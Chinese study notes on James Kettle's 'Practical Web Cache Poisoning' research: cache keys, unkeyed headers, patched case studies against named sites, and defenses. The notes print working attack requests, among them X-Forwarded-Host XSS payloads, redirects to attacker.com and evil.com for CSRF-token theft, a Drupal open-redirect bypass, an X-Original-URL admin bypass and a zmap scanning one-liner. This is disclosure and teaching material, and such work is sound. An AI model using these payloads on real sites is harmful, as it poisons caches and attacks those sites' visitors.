# 2022-04-20：James Kettle: Practical Web Cache Poisoning
## James Kettle, Published: 09 August 2018 at 23:20, UTC Updated: 12 January 2021 at 13:20 UTC
### https://portswigger.net/research/practical-web-cache-poisoning


`Web cache poisoning` 長期以來是一個難以捉摸的漏洞
- 這是一種理論上的威脅，主要用於嚇唬開發人員乖乖地修補沒人能真正利用的問題

## Core Concepts

需要快速了解 caching 的基礎知識
- Web cache 位於 user 和 server之間

在下圖中，我們可以看到三個 user 獲取相同的資源：
![](https://portswigger.net/cms/images/d8/e5/22a1637dd763-article-cache.svg)  

Caching
- 在通過減少延遲來加速頁面載入，並減少 server 的負載
  - 還有其他類型的 cache，例如客戶端瀏覽器 cache 和 DNS cache，但不是本研究的重點

## Cache keys
caching 隱藏了一些危險的假設
- 當 caching 接收到對資源的請求時
  - 它需要決定它是否已經保存了這個確切資源的副本並可以回复
  - 或者它是否需要將請求轉發給 server

辨識兩個 requset 是否試要求相同的資源非常棘手
- 要求 request 逐字節匹配是無效的，因為 HTTP request 充滿了無關緊要的 data

例如請求者的瀏覽器：
```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://google.com/
Cookie: jessionid=xyz;
Connection: close
```

`Caches` 使用 `cache keys` 的概念來解決這問題
- 上面的 `/blog/post.php?mobile=1` 和 `example.com` 就是  cache key 

下面兩個 request 就是相同的，所以第二個 request 就會拿到 cache 的 return
- (cookie different)

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close
```
```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
```

因此，該頁面將以錯誤的語言提供給第二位訪問者
- 第一位使用者，你的 response 可能因此被存在 cache 中，然後被別人存取的。就因為有些 field 沒有被納入 cache key 中

理論上
- 能用 `Vary` header 來 cache key when content negotiation is in use
  - Cloudflare 後來才支援 `Vary`，這篇 blog 有講解怎麼使用 `Vary`
    - https://blog.cloudflare.com/vary-for-images-serve-the-correct-images-to-the-correct-browsers/

## Cache Poisoning
`web cache poisoning` 的目標是
- 發送一個 request，該 request 會導致有害 response 被 cache 並提供給其他 user

![](https://portswigger.net/cms/images/99/13/6505c296bdf4-article-cachepoisoningattack.svg)  

這邊將講解利用 unkeyed inputs 的 HTTP header 來實現 poison caches
- 另外也能用 `HTTP Response Splitting` or `Request Smuggling` 達成

(另外還有一種弱點叫 `Web Cache Deception`，跟 `web cache poisoning` 不一樣，不要搞混了)


## 方法
![](https://portswigger.net/cms/images/ec/b8/0d97faa475af-article-methodology-full-landscape.svg)  

第一步
- 找出 unkeyed inputs
- 手動很乏味，作者寫了 script https://github.com/PortSwigger/param-miner
  - 自動執行，猜 header/cookie names 來觀察 response

找到 unkeyed input 後
- 評估能造成多大傷害
- 嘗試去 store cache
- 如果不成功，需要更了解 cache 的工作原理，並在重試之前找到可緩存的目標頁面
  - 頁面是否被緩存可能取決於多種因素，包括文件 extension、內容類型、路由、 status code 和 response header
- Cached responses 可能不包含 unkeyed inputs

測試 live website 時
- 可能 poisoning other visitors，這會是永久的危險
- 要知道怎麼破壞 cache，當成功時，要把 cache 破壞掉

## Case Studies
(這邊討論的 case 都已經被 patch 了)  

這些案例研究中
- 許多案例都利用了 `XSS in the unkeyed input` 次要漏洞
- 重要的是要記住，如果沒有 `cache poisoning`，這些漏洞是無有用的
  - 因為沒有可靠的方法來強制另一個用戶在 cross-domain request 自定義 header
  - 這可能就是他們如此容易找到的原因


### 首先，Red Hat 的 homepage
```
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://canary/cms/social.png" />
```

上面可以看到 `X-Forwarded-Host` header 被用來產生 Open Graph URL，用在 `<meta>` 中  
下一步就是要研究有沒有機會用在 `cross-site scripting payload` 上  

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/> 
```

上面
- 讓我們確認了，我們能產生一個 response，能執行任何 JS  
- 接著，要檢查這個 response 有沒有在 cache 中  
- 不要因為看到 `Cache Control: no-cache` 就直接放棄，嘗試攻擊看看總是有機會

首先通過重新發送不帶惡意 header 的 request 進行驗證
- 然後直接在另一台機器上測試

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com

HTTP/1.1 200 OK
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

儘管 response 沒有任何表明存在 cache 的 header
- 但漏洞利用顯然已被 cache

用 `DNS lookup` 提供了一種解釋
1. `www.redhat.com` 是 `www.redhat.com.edgekey.net` 的 `CNAME`
2. 表示它正在使用 `Akamai` 的 `CDN`

目前為止
- 已經證明了能夠使 `https://www.redhat.com/en?dontpoisoneveryone=1`

為了真正 poison 並將我們的漏洞利用傳遞給所有後續訪問者
- 需要確保在 cache response 過期後向主頁發送第一個請求
- 可以嘗試使用 `Burp Intruder` 之類的工具或自定義腳本來發送大量請求
- 攻擊者可以通過對目標的 cache system 進行逆向工程
  - 通過仔細閱讀 document 和隨著時間的推移監控站點來預測確切的過期時間

### 以 `unity3d.com` 為例：
```
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```

unkeyed input
- `X-Host` header 被用來產生 script import path
- response headers `'Age'` 和 `'max-age'` 也被指定了
  -  這就指出我們應該多久重新送出 request，保持惡意 cache

選擇性 Poisoning
- HTTP header 可以為 cache 的內部工作提供其他節省時間的見解

### 以下知名網站為例，該網站正在使用 `Fastly`：

```
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 … Firefox/60.0
X-Forwarded-Host: a"><iframe onload=alert(1)>

HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
</iframe> 
```

`Vary` header 告訴我們
- `User-Agent` 可能是 cache key 的一部分
  - 可以手動驗證
  
上面的 case 意味著，我們可以聲稱是使用 `Firefox 60`
- 所以漏洞只會提供給其他 Firefox 60 用戶
  - (當然也可以針對最流行的版本，針對特定 User)
- 所以，如果你知道目標的 user agent，就能制定針對他們的攻擊

DOM Poisoning  
- `XSS payload` 通常比 `unkeyed input` 更容易、有效

### 下一個 case
```
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
<body data-site-root="https://canary/">
```

我們控制了 `data-site-root` 屬性
- 但我們沒辦法成功 XSS，甚至不清楚該屬性的用途
- 為了找出答案，我在 `Burp` 中建了一個匹配和替換規則，為所有請求加一個 `X-Forwarded-Host: id.burpcollaborator.net` header

然後瀏覽該網站。當某些頁面載入時，Firefox 會向我的 server 發送一個 JS 產生的 request

```
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
```

這表示，在某個地方
- 有 JS code 使用 `data-site-root` attri 來載入一些關於 i18n 的 data

我嘗試 fetch `https://catalog.data.gov/api/i18n/en`，想要知道 data format
- 可惜 response 是 empty JSON
- 但，運氣好，把 `en` 改為 `es` 就線索了

```
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov

HTTP/1.1 200 OK
…
{"Show more":"Mostrar más"}
```

我們能這樣利用
```
GET  /api/i18n/en HTTP/1.1
Host: portswigger-labs.net

HTTP/1.1 200 OK
...
{"Show more":"<svg onload=alert(1)>"}
```

這樣，所有看到 `Show more` 頁面的人，就會受到攻擊  


### Hijacking [Mozilla SHIELD](https://wiki.mozilla.org/Firefox/Shield)  
前面測試 `'X-Forwarded-Host` match/replace 時，另外收到一個神秘的訊息

```
GET /api/v1/recipe/signed/ HTTP/1.1
Host: xyz.burpcollaborator.net
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: application/json
origin: null
X-Forwarded-Host: xyz.burpcollaborator.net
```

作者除了之前研究 [CORS vulnerability](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) 時，遇過 `null` 的 origin 之外
- 之前從來沒見過 browser 發出**小寫** 的 `Origin` header
- 罪魁禍首是 Firefox 

Firefox 試圖獲取一份「recipes」列表，作為 SHIELD 系統的一部分
- 用於默認安裝 extension 以用於 marketing 和 research
  - 該系統曾因 forcibly distributing `Mr Robot` extension 而聞名，引起使用者的強烈不滿
    - https://www.cnet.com/news/privacy/mozilla-backpedals-after-mr-robot-firefox-misstep/

無論如何，`X-Forwarded-Host` header 欺騙了這個系統，將 Firefox 引導到我自己的網站以獲取 `recipes`：

```
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net

HTTP/1.1 200 OK
{
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
   …
}
```

Recipes 格式看起來像這樣
```
[{
  "id": 403,
  "last_updated": "2017-12-15T02:05:13.006390Z",
  "name": "Looking Glass (take 2)",
  "action": "opt-out-study",
  "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
  "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
  "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",
}]
```

該系統使用 `NGINX` 進行 cache
- 這也順利 cache 住 Poisoning
- Firefox 會在瀏覽器打開後不久去 fetch 此 URL，並定期重新 fetch
- 最終意味著 Firefox 的所有數千萬日常用戶最終都可以從我的網站拿 recipes

這提供了相當多的可能性
- Firefox 使用的 recipes 經過[簽名](https://github.com/mozilla-services/autograph/tree/main/signer/contentsignature)
- 因此我不只能安裝惡意 extension 並能完整的代碼執行
- 可以將數千萬真正的用戶引導到我選擇的 URL
- 除了明顯的 DDoS 使用之外，如果結合適當的 memory corruption vulnerability，這將非常嚴重


作者向 Mozilla report
- Mozilla 24 小時內修補了，但對嚴重程度存在一些分歧，因此只獲得了 1,000 美元的獎金


### Route poisoning
有些 app 甚至用 header 來產生 URL 作為內部 request 的 routing  

```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary

HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
…
<title>HubSpot - Page not found</title>
<p>The domain canary does not exist in our system.</p>
```

`Goodhire.com` host 在 `HubSpot` 上
- 並且 `HubSpot` 將 `X-Forwarded-Server` header 優先於 `Host` header
- 儘管我們的輸入反映在頁面中，但它是 HTML ，因此簡單的 XSS 攻擊在這裡不起作用

為了利用這點，我們需要訪問 `hubspot.com`
- 將自己註冊為 `HubSpot` client
- 在我們的 `HubSpot` 頁面上放置一個有效 payload
- 然後最終誘使 HubSpot 在 `goodhire.com` 上提供此 payload

```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com

HTTP/1.1 200 OK
…
<script>alert(document.domain)</script>
```

Cloudflare cached 這個 response，也順利提供給後面的訪問者

這樣的內部路由錯誤漏洞在 SaaS 應用程序中特別常見，其中有一個系統處理針對許多不同客戶的 request  

### Hidden Route Poisoning
Route poisoning vulnerabilities 並不總是這麼明顯

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: canary

HTTP/1.1 302 Found
Location: https://ghost.org/fail/ 
```



Cloudflare blog 是 hosted `Ghost`
- 顯然 `Ghost` 利用 `X-Forwarded-Host` header 做某些事情
  - 可以指定別的可是別的 host name 來避免 redirect 失敗，如 `blog.binary.com` 
  - 但，結果是導致神秘的 10 秒 delay，接著還是 response 標準的 `blog.cloudflare.com`



當 User 第一次在 `Ghos`t 上註冊 blog 時
- 它會在 `ghost.io` 下分配一個唯一的 subdomain
- blog 啟動並運行後，User 可以自定義 domain ，例如 `blog.cloudflare.com`
- 如果 User 定義了一個自定義 domain，他們的 ghost.io subdomain 將 redirect 到它

```
GET / HTTP/1.1
Host: noshandnibble.ghost.io

HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

最重要的是，這個 redirect 也可以使用 `X-Forwarded-Host` header 觸發

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io

HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

註冊個人的 `ghost.org` 帳號
- 設定 custom domain
- 就能 redirect `blog.cloudflare.com` 的 request 到自己的 `waf.party` 
- 這樣就能 hijack resource loads like images

![](https://portswigger.net/cms/images/38/8b/c60d1ff4bc9d-article-cloudflareimage.png)  

下一步是想辦法 redirect 到一個 JS，來達到完全控制
- 可以，這個目標被一個怪僻打敗了
- 如果仔細觀察 redirect，會看到他使用 `http`，而 blog 是用 `https` 載入的
- 這表示 browser 的混合內容保護機制 (mixed-content protections) 會啟動並且 block `script/stylesheet` 的 redirections

我找不到任何使 `Ghost` 發出 `HTTPS redirect`的技術方法
- 並且很想將`使用 HTTP 而不是 HTTPS` 作為漏洞報告給 Ghost

最終，我決定通過複製問題並將其放入 [hackxor](https://hackxor.net/) 並附帶現金獎勵來 crowdsource 解決方案
1. 第一個解決方案是由 Sajjad Hashemian 發現的
    - 他發現在 Safari 中，如果 `waf.party` 在瀏覽器的 `HSTS cache` 中，重定向將自動升級到 HTTPS，而不是被阻止
2. Sam Thomas 根據 Manuel Caballero 的工作跟進了 `Edge` 的解決方案
    - 向 `HTTPS URL` 發出 302 redirect 完全繞過 Edge 的 mixed-content protections


總的來說，針對 Safari 和 Edge 用戶
- 能完全破壞 `blog.cloudflare.com`、`blog.binary.com` 和所有 `ghost.org` client 上的每個頁面
- 針對 Chrome/Firefox 用戶，只能劫持 image
  - 儘管在上面的 screenshot 用了 Cloudflare，但由於這是第三方系統中的一個問題，我選擇通過 Binary report

### Chaining 的 Unkeyed Inputs

有的時候 unkeyed input 只會混淆 app 部分的 stack，這時候要 chain (串連) 一些其他的 `unkeyed inputs` 才能有效攻擊

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz

HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=xyz
```

上面 `X-Forwarded-Host` header 覆蓋了 cookie 的 domain
- 但，沒有 URL 被產生、被用來在任何一個 response 中

但，另外還有一個 `unkeyed input`

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps

HTTP/1.1 301 Moved Permanently
Location: https://redacted.net/en
```

這個 input 本身自己也是沒有用處，但我們可以結合這兩個  

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps

HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en 
```

這樣
- 就有能 redirect POST request，然後從 custom HTTP header 來偷 [CSRF tokens](https://portswigger.net/web-security/csrf/tokens)
  - (CSRF token: 在頁面的 form 或是 custom header 裡面放一個 token 並要求 client request 要夾帶這個 token)
- 還可以結合惡意的 JSON load 來 `stored DOM-based` (像上面 svg 的 case)

### Open Graph Hijacking

另一個案例 `unkeyed input` 影響了 `Open Graph URLs`

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com

HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate
…
<meta property="og:url" content='https://attacker.com/en'/>
```

https://ogp.me/

`Open Graph` 是 FB 創造的 protocol
- 用於讓網站所有者決定在社交媒體上共享他們的內容時會發生什麼
- 在這裡劫持的 `og:url`，因此任何被 share poisoned page 的人實際上都會看到我們選擇的內容

這邊有設定了 `'Cache-Control: private'`
- 而 Cloudflare 拒絕 cache 這類 responses
- 運氣好，有其他網站有採用這 cache


```
GET /popularPage HTTP/1.1
Host: redacted.net
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
Set-Cookie: session_id=942…
CF-Cache-Status: MISS
```

`'CF-Cache-Status'` header 表示 Cloudflare 有考慮 cache 這個 response
- 但實際上，response 從來都沒有被 cache
- 推測可能跟 `session_id` cookie 有關

再測試帶有 cookie 的情況

```
GET /popularPage HTTP/1.1
Host: redacted.net
Cookie: session_id=942…;
X-Forwarded-Host: attacker.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
CF-Cache-Status: HIT
…
<meta property="og:url" 
content='https://attacker.com/…
```

最後成功 cache response 了 （後來才意識到，如果有讀 [document](https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/) 的話，這邊就不用這樣猜了  
- 雖然 cache 的 response，但 share 的結果還是沒有中毒
- FB 顯然沒有使用到這個特定的 cache

為了確認到底是哪個 cache 被我們 poison
- 用 cloudflare 的 `/cdn-cgi/trace` 來追蹤
  - (`tracert https://www.aaaaa.com/cdn-cgi/trace`)

![](https://portswigger.net/cms/images/c8/7c/6846e4bc6c75-article-cloudfacebooktrace2.jpg.png)

上面，`colo=AMS` 表示 FB 存取 `waf.party` 是透過阿姆斯特丹的 cache
- 目標網站是在亞特蘭大被存取

![](https://portswigger.net/cms/images/cb/6e/483a36392ba0-article-atlanta.png)

在此之後，任何試圖在他們的網站上分享各種頁面的人最終都會分享我選擇的內容  

### Local Route Poisoning
在研究這主題時，作者也發現一些一些非標準的 header  
- `translate`, `bucket` and `path_info`
- 然後開始懷疑，說不定 miss 掉很大一部分
- 作者搜尋 github 上 20000 個 PHP 專案來擴充 header wordlist

經過擴充後，作者的研究又更多結果了
- 找出了 `X-Original-URL` and `X-Rewrite-URL` 會覆蓋 request 的路徑
- 首先注意到這能影響使用 `Drupal` (CMS) 的目標
- 研究 `Drupal` source code 後發現，了解這來自 PHP 的熱門框架 `Symfony`
- `Symfony` 又是從 `Zend`

最終導致大量的 PHP app 不知不覺中支援這些 header  

```
GET /admin HTTP/1.1
Host: unity.com


HTTP/1.1 403 Forbidden
...
Access is denied
```

```
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin

HTTP/1.1 200 OK
...
Please log in
```

如果 app 使用 cache 的話，這些 header 就會被濫用
- 例如這個 request `/education?x=y` 有 cache key，但從 `/gambling?x=y` 來取 data


![](https://portswigger.net/cms/images/7b/46/0dc96adf39de-article-cache-busting-1.svg)

最終結果是，在發送此 request 後
- 任何嘗試訪問 Unity for Education 頁面的人都會中招

![](https://portswigger.net/cms/images/36/ff/73c660a4bcf4-article-unitymaybe.png)


### Internal Cache Poisoning
`Drupal` 經常跟第三方 cache 一起使用，例如 `Varnish`
- 但它也默認啟用 internal cache
- cache 知道 `X-Original-URL`，並視為 cache key
- 但，錯誤的把 querysting 也包含進去

![](https://portswigger.net/cms/images/6c/c2/0148b0dd31eb-article-cache-busting-2.svg)
 
this one lets us override the query string:  
- 這種攻擊更容易達成，但影響有限，因為涉及第三方
```
GET /search/node?keys=kittens HTTP/1.1

HTTP/1.1 200 OK
…
Search results for 'snuff'
```

### Drupal Open Redirect

在閱讀 Drupal 的 URL-override source code 時
- 注意到一個非常危險的特性，在所有 redirect responses 中，可以使用 `destination` querystring 覆蓋 redirect 目標
- Drupal 嘗試一些 URL parse 以確保它不會 redirect 到其他 domain，但這很容易繞過


```
GET //?destination=https://evil.net\@unity.com/ HTTP/1.1
Host: unity.com

HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

Drupal 看到 double-slash `//` 在裡面時，會嘗試 redirect 回到 `/` 修正他
- Drupal 認為目標 URL 告訴人們使用 username `evil.com` 來訪問 `unity.com`
- 實際上，borwser 自動把 `\` 轉換成 `/`，把 user 導向 `evil.net/@unity.com` 去

open redirection 的問題本身並不嚴重，但卻是讓人能進行更危險攻擊的一條路徑

### Persistent redirect 的挾持
結合 `parameter override` 跟 `open redirect` 來 persistently hijack any redirect  

`Pinterest` 的 business website 某些頁面，用 redirect 來 import JS  
這 request
- `/foo.js?v=1` 被 cache poison 了
- 參數數 `destination=https://evil.net\@business.pinterest.com/`

```
GET /?destination=https://evil.net\@business.pinterest.com/ HTTP/1.1
Host: business.pinterest.com
X-Original-URL: /foo.js?v=1
```

這 hijacks 的 JS import 的路徑
- 讓我們能完全掌控幾個原本應該是 static page 的頁面

```
GET /foo.js?v=1 HTTP/1.1

HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

### Cross-Cloud Poisoning
一位評分員，用 [CVSS](https://www.hackerone.com/vulnerability-management/common-vulnerability-scoring-system-cvss-complete-explanation) 評估作者 report 給 CloudFront 的 issue，評定為 `high`
- 給出的理由是，需要 rent 好多 VPSs 才有可能感染所有 CloudFront's caches

作者先忍住去爭論這件事情，進一步思考
- 是否可能在不依賴 VPS 的情況下進行跨區域攻擊。

CloudFront 有一張有用的緩存地圖
- 可以使用免費的 online service 識別其 IP 地址
- 這些服務會從一系列地理位置發出 DNS 查詢

由於 Cloudflare 有更多的不停地區 cache
- Cloudflare publish 了所有 IP 列表
- 因此我編寫了一個快速 script 來通過每個 IP request `waf.party/cgn-cgi/trace` 並記錄我訪問的 cache

```shell
curl https://www.cloudflare.com/ips-v4 | sudo zmap -p80| zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' cf80scheme | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'
```

這表明當定位 `waf.party`（託管在愛爾蘭）時，可以從我在曼徹斯特的家中訪問以下 cache
```
104.28.19.112 LHR    172.64.13.163 EWR    198.41.212.78 AMS
172.64.47.124 DME    172.64.32.99 SIN     108.162.253.199 MSP
172.64.9.230 IAD     198.41.238.27 AKL    162.158.145.197 YVR
```

### The common pitfall

截至 2021 年，這研究中收到的最常見問題來自那些
- 發現他們可以使用 Burp Repeater 或代理瀏覽器複製 cache poisoning vulnerability，但不能在未代理瀏覽器中復制的人
- 當瀏覽器和 Burp 發出的 request 略有不同時，就會發生這種情況

而不同之處在於 request 的 keyed part
- 要識別差異，請比較瀏覽器開發者控制台中顯示的請求和 `Logger++` 中記錄的請求

兩個最常見的原因是：
- `Param Miner` enable 了 `Add fcbz cachebuster'`
  - 它為 Burp 的 request add 了 static query parameter
- server 已在 cache key 中包含 `Accept-Encoding` header
  - 在 Burp Suite 中， `Proxy>Options>Remove unsupported encodings` 會 rewrites this header

### Defense
cache poisoning 最有效的防禦是
- 禁止 cache，但這不現實
- 將 cache 限制為純 static response 也是有效的，前提是你對定義為 static 的內容足夠警惕

同樣
- 避免從 `headers` 和 `cookie` 獲取輸入是防止 cache poisoning 的有效方法
  - 但很難知道其他層和框架是否在偷偷支持額外的 headers
- 因此，建議使用 [Param Miner](https://github.com/PortSwigger/param-miner) 審核 app 的每個頁面，以清除 unkeyed inputs

一旦從你的 app 中識別出 `unkeyed inputs`
- 最理想的做法就是徹底禁止 `unkeyed inputs`
- 如果不行，那可以在 cache layer 抽離它，或者把它加入 cache key 中
- 一些 cache 允許你使用 `Vary` header or custome cache key，但有可能限制為 enterprise 才能用的 feature

最後，無論你的 app 是否有 cache
- 你某些客戶端可能在其末端有 cache，因此不應忽略 HTTP header 中的 XSS 等客戶端漏洞

### Conclusion
- Web cache poisoning 不是理論上的漏洞
- 即使使用之名 library, framework 也有危險
- 由於架構上使用 cache 是很常見的，讓這種攻擊的機會變多，而且很難單獨進行充分評估
